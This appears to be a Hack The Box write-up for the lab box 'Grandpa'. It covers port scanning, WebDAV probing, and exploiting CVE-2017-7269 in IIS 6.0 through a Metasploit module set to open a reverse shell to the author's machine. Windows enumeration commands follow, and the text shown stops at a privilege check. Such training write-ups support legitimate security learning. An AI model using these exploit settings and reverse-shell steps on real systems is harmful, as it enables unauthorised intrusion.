@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Windows box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;grandpa#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Grandpa<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2024-02-11</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#host-10-10-10-14">Host 10.10.10.14</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#iis">IIS</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#foothold-cve-2017-7269">Foothold (CVE-2017-7269)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#version">Version</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#hotfixes">Hotfixes</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#nics">NICs</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#access-tokens">Access tokens</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#privilege-escalation-token-kidnapping">Privilege escalation (Token kidnapping)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#preparation-1">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#exploitation-1">Exploitation</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#flags">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2017-04-12</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/1">ch4p</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.10</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-10-14">Host <code>10.10.10.14</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Grandpa using a TCP SYN
+<code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.14<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.14<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the service associated
+with the open TCP port we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.14<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">80/tcp open  http    Microsoft IIS httpd 6.0
+</span><span class="z-text z-plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Grandpa is running Windows.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP service to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.14<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Under Construction
+</span><span class="z-text z-plain">| http-webdav-scan: 
+</span><span class="z-text z-plain">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+</span><span class="z-text z-plain">|   Server Type: Microsoft-IIS/6.0
+</span><span class="z-text z-plain">|   Server Date: Sun, 11 Feb 2024 12:47:10 GMT
+</span><span class="z-text z-plain">|   WebDAV type: Unknown
+</span><span class="z-text z-plain">|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+</span><span class="z-text z-plain">| http-methods: 
+</span><span class="z-text z-plain">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-webdav-scan</code> script found that the website allows a few WebDAV
+methods... this is worth digging into later on!</p>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="iis">IIS</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://10.10.10.14/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/iis-homepage.png" alt="IIS homepage" /></p>
+<p>It reminds me of another box... <a href="../granny/index.md">Granny</a>! The similarity of
+their names is probably no coincidence.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/iis-homepage-wappalyzer.png" alt="IIS homepage Wappalyzer extension" /></p>
+<p>This reveals that this web page is using ASP.NET.</p>
+<h4 id="exploration-1">Exploration</h4>
+<p>Unfortunately, this box is not vulnerable to the same file upload vulnerability
+as <a href="../granny/index.md">Granny</a>.</p>
+<h4 id="webdav">WebDAV</h4>
+<p>The <code>nmap</code> scripts we ran <a href="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/#scripts">earlier</a> revealed that IIS was using
+WebDAV, and a wealth of details on it. Let's use <code>davtest</code> to verify this:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> davtest<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>url</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.14/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain"> Testing DAV connection
+</span><span class="z-text z-plain">OPEN            SUCCEED:                http://10.10.10.14
+</span><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain">NOTE    Random string for this session: uiCPNSbB8uG
+</span><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain"> Creating directory
+</span><span class="z-text z-plain">MKCOL           FAIL
+</span><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain"> Sending test files
+</span><span class="z-text z-plain">PUT     shtml   FAIL
+</span><span class="z-text z-plain">PUT     pl      FAIL
+</span><span class="z-text z-plain">PUT     jhtml   FAIL
+</span><span class="z-text z-plain">PUT     asp     FAIL
+</span><span class="z-text z-plain">PUT     aspx    FAIL
+</span><span class="z-text z-plain">PUT     php     FAIL
+</span><span class="z-text z-plain">PUT     jsp     FAIL
+</span><span class="z-text z-plain">PUT     cfm     FAIL
+</span><span class="z-text z-plain">PUT     html    FAIL
+</span><span class="z-text z-plain">PUT     cgi     FAIL
+</span><span class="z-text z-plain">PUT     txt     FAIL
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">********************************************************
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Everything failed.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>IIS 6.0</code>, we find
+<a href="https://www.exploit-db.com/exploits/41738">Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow</a>
+(<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7269">CVE-2017-7269</a>).</p>
+<h2 id="foothold-cve-2017-7269">Foothold (<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7269">CVE-2017-7269</a>)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7269">CVE-2017-7269</a> is a buffer
+overflow vulnerability in Windows Server 2003 R2's IIS version <code>6.0</code>. The
+vulnerability lies in the <code>ScStoragePathFromUrl</code> function of IIS' WebDAV
+service. By sending a long enough header beginning with <code>If: &lt;http://</code> in a
+PROPFIND, an attacker can get RCE.</p>
+<h3 id="preparation">Preparation</h3>
+<p>I'll use the Metasploit module
+<code>exploit/windows/iis/iis_webdav_scstoragepathfromurl</code> to exploit this
+vulnerability, since it's non-trivial to do by hand.</p>
+<p>I'll set the <code>payload</code> to <code>payload/windows/shell_reverse_tcp</code>, the <code>RHOSTS</code> to
+<code>10.10.10.14</code>, the <code>LHOST</code> to <code>10.10.14.10</code> and the <code>LPORT</code> to <code>9001</code>.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>No we can launch the exploit!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">msf6</span></span><span class="z-meta z-function-call z-arguments z-shell"> exploit(windows/iis/iis_webdav_scstoragepathfromurl</span><span class="z-meta z-function-call z-shell"></span>) <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> run
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">c:\windows\system32\inetsrv&gt;
+</span></code></pre>
+<p>It went off without a hitch.</p>
+<p>However, I don't like Metasploit's shell, so I'll open my own on port <code>9002</code>.
+Unfortunately, Powershell doesn't exist on this box.</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as
+<code>NT AUTHORITY\Network Service</code>.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Grandpa's architecture?</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v PROCESSOR_ARCHITECTURE
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+</span><span class="z-text z-plain">    PROCESSOR_ARCHITECTURE    REG_SZ    x86
+</span></code></pre>
+<p>It's using x86. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="version">Version</h3>
+<p>Let's gather some information about the Windows version of Grandpa.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v ProductName <span class="z-constant z-character z-escape z-dosbatch">^
+</span></span><span class="z-source z-dosbatch">    <span class="z-keyword z-operator z-conditional z-dosbatch">&amp;&amp;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v CurrentBuildNumber
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    ProductName    REG_SZ    Microsoft Windows Server 2003 R2
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    CurrentBuildNumber    REG_SZ    3790
+</span></code></pre>
+<p>In fact, it's Windows Server 2003 R2 build <code>3790</code>.</p>
+<h3 id="hotfixes">Hotfixes</h3>
+<p>Let's retrieve the list of installed hotfixes.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-control z-repeat z-dosbatch">for</span> /f <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>tokens=7 delims=\<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> <span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>a in (&#39;reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Hotfix&quot;&#39;) do @echo <span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>a
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Q147222
+</span></code></pre>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">net localgroup</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>Users<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> <span class="z-keyword z-operator z-pipe z-dosbatch">|</span> <span class="z-keyword z-command z-dosbatch">find</span> /V <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">ASPNET
+</span><span class="z-text z-plain">Harry
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's <code>ASPNET</code> and <code>Harry</code>.</p>
+<p>What about the administrators?</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">net localgroup</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>Administrators<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> <span class="z-keyword z-operator z-pipe z-dosbatch">|</span> <span class="z-keyword z-command z-dosbatch">find</span> /V <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Administrator
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's only the built-in <code>Administrator</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">net localgroup</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">*Administrators
+</span><span class="z-text z-plain">*Backup Operators
+</span><span class="z-text z-plain">*Distributed COM Users
+</span><span class="z-text z-plain">*Guests
+</span><span class="z-text z-plain">*HelpServicesGroup
+</span><span class="z-text z-plain">*IIS_WPG
+</span><span class="z-text z-plain">*Network Configuration Operators
+</span><span class="z-text z-plain">*OWS_209498277_admin
+</span><span class="z-text z-plain">*Performance Log Users
+</span><span class="z-text z-plain">*Performance Monitor Users
+</span><span class="z-text z-plain">*Power Users
+</span><span class="z-text z-plain">*Print Operators
+</span><span class="z-text z-plain">*Remote Desktop Users
+</span><span class="z-text z-plain">*Replicator
+</span><span class="z-text z-plain">*TelnetClients
+</span><span class="z-text z-plain">*Users
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">ipconfig</span> /all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Host Name . . . . . . . . . . . . : granpa
+</span><span class="z-text z-plain">   Primary Dns Suffix  . . . . . . . : 
+</span><span class="z-text z-plain">   Node Type . . . . . . . . . . . . : Unknown
+</span><span class="z-text z-plain">   IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Local Area Connection:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-50-56-B9-EF-62
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   IP Address. . . . . . . . . . . . : 10.10.10.14
+</span><span class="z-text z-plain">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+</span><span class="z-text z-plain">   Default Gateway . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">   DNS Servers . . . . . . . . . . . : 10.10.10.2
+</span></code></pre>
+<p>There's just an Ethernet interface.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="access-tokens">Access tokens</h3>
+<p>Let's retrieve the privileges associated with our current access token.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">whoami</span> /priv
+</span></code></pre>
